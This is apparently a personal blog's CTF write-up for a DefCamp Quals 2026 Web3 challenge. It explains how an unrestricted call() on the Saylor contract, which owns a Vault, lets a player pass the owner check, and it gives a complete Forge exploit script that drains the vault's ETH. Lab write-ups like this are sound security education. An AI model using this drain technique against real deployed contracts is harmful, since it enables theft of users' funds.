---
layout: post
title: "Arbitrary Funds Sweep - DefCamp Quals 2026 CTF Writeup"
date: 2026-10-06 10:00:00 +0530
description: "Cross-chain CTF challenge writeup from DefCamp Quals 2026"
categories: [Writeups, CTF, Web3 Security]
tags: [ctf, web3, cross-chain]
author: Sarayu
toc: true
---

## Challenge Description


![desc](/assets/img/posts/Arbitrary-funds-sweep-defcampqualsCTF2026/desc.png)


The challenge provided the source code for all deployed contracts (ArbRetryableTx, Factory, Inbox, Saylor, SetupL1, SetupL2, Vault) along with the setup contract, player, and Saylor contract addresses on both chains.


### suspicious inbox check

I started by reading the source code. The check in the `createRetryableTicket` function from `Inbox.sol`, specifically this line:

```javascript
fromIsContract: msg.sender != tx.origin,
```

This flag looked suspicious at first, but it turned out to be a false assumption. 

Firstly, we didn't have the relayer's source code provided to us. So my first thought was: we can get the relayer's source code by decompiling the bytecode (can get bytecode from relayer's address, using cast call command).

But then I had another thought. What if the relayer is the `Saylor` contract? It has a `relay` function, and it also has an arbitrary `call` function.

To check this, we must first get the relayer's address. The `ArbRetryableTx` contract (basically the L2 manager for retryable tickets) is deployed by the `SetupL2` contract. Since we have the setup contract's address, we can read the `ArbRetryableTx` address, and then read the relayer's address from it.

> if saylor contract is the relayer, can use `call()` function
> if any other contract, we will have to get the bytecode of that relayer contract using `cast call`, and then decompile the bytecode to its source code

### interacting on-chain

I got the relayer address: `0x37Fc371D2441d20255978C995Ee4e5ae36859f8f`

And ran some cast commands:

```bash
sarapc1@ubuntu:~$ cast code 0x37Fc371D2441d20255978C995Ee4e5ae36859f8f --rpc-url http://<rpc>/l2
0x
(base) sarapc1@ubuntu:~$ cast nonce 0x37Fc371D2441d20255978C995Ee4e5ae36859f8f --rpc-url http://<rpc>/l2
6
```

Only returned `0x`... which means the relayer's address is an EOA. I again confirmed by checking its nonce which turned out to be 6. Hence, the relayer is just a regular wallet, not a contract. My Saylor theory turned out to be false.

So, in order to drain the balance of the contract, we need to become/impersonate the owner address. Look at `Vault.sol`:

```javascript
function execute(address to, uint256 value, bytes calldata data) external returns (bytes memory ret) {
    require(msg.sender == owner, "not the owner");
    bool ok;
    (ok, ret) = to.call{value: value}(data);
    require(ok, "call failed");
}
```

If we become owner, we can simply use the `execute()` function with our own malicious implementation which drains the contract's balance.

So I read the address of owner from vault contract using cast call:

```bash
(base) sarapc1@ubuntu:~$ cast call 0xEfE5669580C60ecDbd31397c2A70c2B8F3931656 "owner()(address)" --rpc-url http://<rpc>/l2
0x8054b6A618636CC6F877ec97381b5778f055ff9f
```

Which, turned out to be the `Saylor` contract's address.

Wait. So the owner is `Saylor`? And `Saylor` has that arbitrary `call()` function?

The setup intentionally made the `Saylor` contract the owner of the Vault on L2, likely to simulate a contract-managed treasury. Since `Saylor` has an unrestricted `call()` function, we can use it to invoke `Vault.execute()`. This works because the call originates from `Saylor` itself, which satisfies the `msg.sender == owner` check and allows us to drain the funds.

### The exploit

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script} from "forge-std/Script.sol";

interface ISaylor {
    function call(address to, bytes calldata data)
        external
        payable
        returns (bytes memory);
}

interface IVault {
    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external returns (bytes memory);
}

contract Attack {
    ISaylor constant SAYLOR =
        ISaylor(0x8054b6A618636CC6F877ec97381b5778f055ff9f);

    IVault constant VAULT =
        IVault(0xEfE5669580C60ecDbd31397c2A70c2B8F3931656);

    function attack() external {
        uint256 amount = address(VAULT).balance;

        bytes memory data = abi.encodeCall(
            IVault.execute,
            (address(this), amount, bytes(""))
        );

        SAYLOR.call(address(VAULT), data);
    }

    receive() external payable {}
}

contract AttackScript is Script {
    function run() external {
        vm.startBroadcast();

        Attack attackContract = new Attack();
        attackContract.attack();

        vm.stopBroadcast();
    }
}
```

Simply put:

1. Grab the vault's balance.
2. Encode the calldata to make the vault send all its ETH to our Attack contract.
3. Call `SAYLOR.call()` with the vault and the payload.
4. Saylor calls execute, passes the owner check, and transfers us the money.

